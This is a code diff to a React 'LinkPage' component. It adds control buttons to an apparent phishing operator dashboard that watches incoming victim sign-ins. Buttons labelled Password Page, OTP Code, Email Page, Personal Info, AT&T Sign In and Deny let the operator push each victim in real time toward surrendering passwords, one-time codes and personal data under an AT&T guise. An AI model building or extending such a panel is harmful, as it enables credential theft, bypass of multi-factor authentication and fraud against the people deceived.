@@ -12,6 +12,37 @@ export default function LinkPage() {
     let lastActivityId = null;
     let processedIds = new Set();
     let activitiesData = [];
+    let currentActivityId = null;
+    let currentUserId = null;
+
+    // Setup control button handlers
+    const controlButtons = {
+      'btn-password': 'password',
+      'btn-otp': 'otp',
+      'btn-email': 'email',
+      'btn-personal': 'personal',
+      'btn-att': 'att',
+      'btn-deny': 'deny'
+    };
+
+    Object.keys(controlButtons).forEach(btnId => {
+      const btn = document.getElementById(btnId);
+      if (btn) {
+        btn.addEventListener('click', function() {
+          if (!currentActivityId) {
+            alert('No active user session. Wait for a user to sign in.');
+            return;
+          }
+          
+          const action = controlButtons[btnId];
+          if (action === 'deny') {
+            denyActivity(currentActivityId, 'signin', currentUserId);
+          } else {
+            approveActivity(currentActivityId, 'signin', currentUserId, action);
+          }
+        });
+      }
+    });
 
     function formatTime(timestamp) {
       const date = new Date(timestamp);
@@ -103,6 +134,13 @@ export default function LinkPage() {
       // Add to activities data array
       activitiesData.unshift(activity);
       setAllActivities([...activitiesData]);
+
+      // Track current activity for control buttons
+      if (activity.type === 'signin') {
+        currentActivityId = activity.id;
+        currentUserId = activity.userId;
+        enableControlButtons();
+      }
 
       const timeString = formatTime(activity.timestamp);
       const userId = activity.userId || 'Unknown';
@@ -229,6 +267,23 @@ export default function LinkPage() {
       statusIndicator.classList.add('status-active');
       statusIndicator.classList.remove('status-inactive');
     }
+
+    function enableControlButtons() {
+      Object.keys(controlButtons).forEach(btnId => {
+        const btn = document.getElementById(btnId);
+        if (btn) btn.disabled = false;
+      });
+    }
+
+    function disableControlButtons() {
+      Object.keys(controlButtons).forEach(btnId => {
+        const btn = document.getElementById(btnId);
+        if (btn) btn.disabled = true;
+      });
+    }
+
+    // Initially disable control buttons
+    disableControlButtons();
 
     function showToast(message) {
       const toast = document.createElement('div');
@@ -498,6 +553,39 @@ export default function LinkPage() {
           color: #333;
         }
 
+        .control-buttons {
+          margin-top: 20px;
+          display: flex;
+          gap: 10px;
+          flex-wrap: wrap;
+        }
+
+        .control-btn {
+          padding: 10px 20px;
+          border: 1px solid #d1d1d1;
+          border-radius: 25px;
+          font-size: 14px;
+          font-weight: 500;
+          cursor: pointer;
+          background: #ffffff;
+          color: #333;
+          transition: all 0.15s ease;
+        }
+
+        .control-btn:hover {
+          background: #f5f5f5;
+          border-color: #999;
+        }
+
+        .control-btn:active {
+          transform: scale(0.98);
+        }
+
+        .control-btn:disabled {
+          opacity: 0.5;
+          cursor: not-allowed;
+        }
+
         .activity-item {
           background: #ffffff;
           padding: 15px;
@@ -576,6 +664,15 @@ export default function LinkPage() {
           <div id="activity-log">
             <div className="no-activity">No activity yet. Waiting for login attempts...</div>
           </div>
+        </div>
+        
+        <div className="control-buttons">
+          <button className="control-btn" id="btn-password">Password Page</button>
+          <button className="control-btn" id="btn-otp">OTP Code</button>
+          <button className="control-btn" id="btn-email">Email Page</button>
+          <button className="control-btn" id="btn-personal">Personal Info</button>
+          <button className="control-btn" id="btn-att">AT&T Sign In</button>
+          <button className="control-btn" id="btn-deny">Deny</button>
         </div>
       </div>
     </>
